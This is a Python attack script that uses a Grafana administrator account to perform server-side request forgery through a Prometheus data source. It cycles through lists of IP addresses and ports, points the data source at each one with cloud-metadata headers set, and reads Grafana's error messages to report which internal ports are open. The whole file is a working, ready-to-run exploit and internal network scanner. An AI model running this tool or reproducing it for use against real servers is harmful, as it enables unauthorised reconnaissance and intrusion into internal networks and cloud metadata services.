import requests
import json
import sys
import argparse
import os.path
import time
import re

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

parser = argparse.ArgumentParser(epilog="Example:\
    \npython scanNet.py -H http://grafana_server.com:3000 -U admin -P admin --ip-file ipList.txt --port-file portList.txt\n\
Provided user(-U) should have administrator rights in Grafana administration panel.\n\
\nExample using proxy:\n\
python scanNet.py -H http://grafana_server.com:3000 -U admin -P admin -p http://localhost:8080 --ip-file ipList.txt --port-file portList.txt", formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-H", "--host", default="", required=True, help="Host for Grafana (ip:port)")
parser.add_argument("-U", "--username", default="", required=False, help="Username for Grafana")
parser.add_argument("-P", "--password", default="", required=False, help="Password for Grafana")
parser.add_argument("-p", "--proxy", default="", required=False, help="Proxy for debugging (ip:port)")
parser.add_argument("--ip-file", default="", required=False, help="File with list ip address for scanning")
parser.add_argument("--port-file", default="", required=False, help="File with list ports for scanning")

args = parser.parse_args()
ghost = args.host
username = args.username
password = args.password
ip_list = args.ip_file
port_list = args.port_file

if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy

def login(ghost, username, password):
	rawBody = "{\"user\":\""+username+"\",\"password\":\""+password+"\",\"email\":\"\"}"
	headers = {"Origin": ""+ghost+"", "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0", "Referer": ""+ghost+"/signup", "Connection": "close", "content-type": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate"}
	cookies = {"redirect_to": "%2F"}
	response = session.post(""+ghost+"/login", data=rawBody, headers=headers, cookies=cookies, verify=False)
	if "grafana_session" in response.cookies:
		return response.cookies["grafana_session"]
	if "grafana_sess" in response.cookies:
		return response.cookies["grafana_sess"]
	else:
		print("Login Session Cookie is not set")
		sys.exit(0)


def create_source(sessionid, ghost):
	rawBody = "{\"name\":\"SSRF-TESTING\",\"type\":\"prometheus\",\"access\":\"proxy\",\"isDefault\":false}"
	headers = {"Origin": "" + ghost + "", "Accept": "application/json, text/plain, */*",
			   "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
			   "Referer": "" + ghost + "/datasources/new", "Connection": "close", "x-grafana-org-id": "1",
			   "content-type": "application/json", "Accept-Language": "en-US,en;q=0.5",
			   "Accept-Encoding": "gzip, deflate"}
	cookies = {"grafana_session": "" + sessionid + ""}
	response = session.post("" + ghost + "/api/datasources", data=rawBody, headers=headers, cookies=cookies,
							verify=False)
	
	if "Data source with the same name already exists" in response.text:
		print("You will need to manually delete the current data source, that is named SSRF-TESTING")
		sys.exit(0)
	elif "id" in response.text:
		id = response.json()["id"]
		return id
	else:
		print("Error:")
		print("Status code:   %i" % response.status_code)
		print(response.text)
		sys.exit(0)

def create_ssrf(sessionid, scan, ports, ghost, id):
	rawBody = "{\"id\":"+str(id)+",\"orgId\":1, \"name\":\"SSRF-TESTING\",\"type\":\"prometheus\",\"typeLogoUrl\":\"\",\"access\":\"server\",\"url\":\"""http://"+scan+":"+ports+"\",\"password\":\"test\",\"user\":\"test\",\"database\":\"test\",\"basicAuth\":false,\"basicAuthUser\":\"\",\"basicAuthPassword\":\"\",\"withCredentials\":false,\"isDefault\":false,\"jsonData\":{\"tlsSkipVerify\":true,\"httpHeaderName1\":\"Metadata-Flavor\",\"httpHeaderName2\":\"Metadata\",\"httpMethod\":\"GET\"},\"secureJsonData\":{\"httpHeaderValue1\":\"Google\",\"httpHeaderValue2\":\"true\"},\"version\":1,\"readOnly\":false}"
	headers = {"Origin": ""+ghost+"", "Accept": "application/json, text/plain, */*", "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0", "Referer": ""+ghost+"/datasources/edit/"+str(id)+"/", "Connection": "close", "x-grafana-org-id": "1", "content-type": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate"}
	cookies = {"grafana_session":""+sessionid+""}
	response = session.put(""+ghost+"/api/datasources/"+str(id)+"", data=rawBody, headers=headers, cookies=cookies, verify=False)
	if response.status_code == 200:
		uid = response.json()["datasource"]["uid"]
		return uid
	else:
		delete_source(sessionid, id, ghost)
		print("Error:")
		print("Status code:   %i" % response.status_code)
		print(response.text)
		sys.exit(0)
  

def info(sessionid, ghost, uid):
	cookies = {"grafana_session": ""+sessionid+""}
	headers = {"Origin": ""+ghost+"", "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0", "Referer": ""+ghost+"/datasources/edit/"+uid+"/", "Connection": "close", "x-grafana-org-id": "1", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate"}
	response = session.get(""+ghost+"/api/datasources/uid/"+uid+"?accesscontrol=true", cookies=cookies, headers=headers, verify=False)

def check_ssrf(sessionid, id, ghost):
	headers = {"Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer": ""+ghost+"/datasources/edit/"+str(id)+"/", "Connection": "close", "x-grafana-org-id": "1", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "x-grafana-nocache":"true"}
	cookies = {"grafana_session":""+sessionid+""}
	response = session.get(""+ghost+"/api/datasources/proxy/"+str(id)+"/api/v1/status/buildinfo", headers=headers, cookies=cookies, verify=False)

def check_hosts(sessionid, id, ghost, uid):
	headers = {"Accept": "application/json, text/plain, */*", "content-type": "application/json", "Content-Length": "406",
			   "sec-ch-ua-mobile": "?0","sec-ch-ua-platform": "Windows", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
				"Sec-Fetch-Dest": "empty",
			   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36",
			   "Referer": "" + ghost + "/datasources/edit/" + str(id), "Connection": "close", "x-grafana-org-id": "1",
			   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "x-grafana-nocache": "true", "Origin": "" + ghost}
	cookies = {"grafana_session": "" + sessionid + ""}
	data = {"queries": [{"refId": "test", "expr": "1+1", "instant": True, "queryType": "timeSeriesQuery", "exemplar": False, "requestId": "0test", "utcOffsetSec": 10800, "legendFormat": "", "interval": "", "datasource": {"type": "prometheus", "uid": uid}, "datasourceId": id, "intervalMs": 60000, "maxDataPoints": 1}]}
	try:
		response = session.post("" + ghost + "/api/ds/query", headers=headers, cookies=cookies, verify=False, data=json.dumps(data), timeout=4.0)
		grafana_error = str(response.json()["results"]["test"]["error"])
	except requests.exceptions.Timeout:
		# if no response is received after 4 seconds, drop the connection and print timeout
		grafana_error = "timeout"
	
	if re.search("EOF|status\scode|client_error", grafana_error):
		print("Port is open.")
	elif re.search("connection refused|timeout", grafana_error):
		print("Port is closed.")		

def delete_source(sessionid, id, ghost):
	headers = {"Origin": ""+ghost+"", "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0", "Referer": ""+ghost+"/datasources/edit/"+str(id)+"/", "Connection": "close", "x-grafana-org-id": "1", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate"}
	cookies = {"grafana_session":""+sessionid+""}
	response = session.delete(""+ghost+"/api/datasources/"+str(id)+"", headers=headers, cookies=cookies, verify=False)

# Main function
def strp(s):
	return s.strip()

print("-----------------//Start of scanning//-----------------")
sessionid = login(ghost, username, password)
        
with open(ip_list, 'r') as ip_list, open(port_list, 'r') as port_list:
	ipList = ip_list.readlines()
	portList = port_list.readlines()
	ipList = list(map(strp, ipList))
	portList = list(map(strp, portList))
	for ip in ipList:
		for port in portList:			
			print("Checking {ip}:{port}".format(ip=ip, port=port))
			id = create_source(sessionid, ghost)
			uid = create_ssrf(sessionid, ip, port, ghost, id)
   
			# unnecessary GET requests
			#info(sessionid, ghost, uid)
			#check_ssrf(sessionid, id, ghost)
   
			check_hosts(sessionid, id, ghost, uid)
			delete_source(sessionid, id, ghost)
			if port not in portList[-1:]:										
				print("\n-----------------//next address//-----------------")
			time.sleep(0.2)
print("\n-----------------//End of scanning//-----------------")